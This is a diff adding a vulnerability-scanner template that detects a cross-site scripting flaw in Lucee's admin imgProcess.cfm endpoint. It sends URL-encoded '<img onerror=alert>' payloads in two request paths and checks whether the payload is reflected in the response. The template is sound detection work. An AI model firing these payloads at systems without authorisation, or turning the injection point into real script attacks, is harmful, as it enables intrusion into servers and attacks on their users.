@@ -1,0 +1,26 @@
+id: lucee-xss
+brief:
+    title: Lucee - Cross-Site Scripting
+    by: incogbyte
+    level: high
+    about: Lucee contains a cross-site scripting vulnerability. It allows remote attackers to inject arbitrary JavaScript into the responses returned by the server.
+    label:
+        - lucee
+        - xss
+        - unauth
+        - intrusive
+        - vuln
+    score: CVSS:7.2
+moves:
+    - verb: GET
+      to:
+        - '{{BaseURL}}/lucees3ezf%3cimg%20src%3da%20onerror%3dalert(''{{randstr}}'')%3elujb7/admin/imgProcess.cfm'
+        - '{{BaseURL}}/lucee/lucees3ezf%3cimg%20src%3da%20onerror%3dalert(''{{randstr}}'')%3elujb7/admin/imgProcess.cfm'
+      signs:
+        - "on": word
+          has:
+            - <img src=a onerror=alert('{{randstr}}')>
+            - MissingIncludeException
+            - lucee-err
+          in: body
+          need: all
